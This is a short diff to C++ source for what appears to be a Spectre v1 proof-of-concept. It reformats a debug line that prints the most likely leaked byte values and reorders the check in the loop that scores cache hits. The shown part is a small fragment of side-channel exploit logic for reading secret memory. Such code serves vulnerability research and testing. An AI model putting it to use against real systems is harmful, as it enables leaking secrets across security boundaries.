@@ -28,9 +28,8 @@ volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_v
         {
             break;
         }
-
     }
-    D((int)high << " (" << results[high] << ") | " << (int) high2 << " (" << results[high2] << ")");
+    D("[*] "<< std::hex << high << " (" << std::dec << results[high] << ") | " << std::hex << high2 << " (" << std::dec << results[high2] << ")");
     *p_val = high;
 }
 
@@ -67,7 +66,7 @@ inline void Spectrev1::find_hits(size_t train_x)
     for (i = 0; i < MAX_BYTE; ++i)
     {
         mix_i = MIX(i);
-        if ( is_hit(load(&p_scratchpad[mix_i*block_len])) && mix_i != p_base[train_x] )
+        if ( mix_i != p_base[train_x] && is_hit(load(&p_scratchpad[mix_i*block_len])) )
         {
             ++results[mix_i];
             // Find the two highest scores
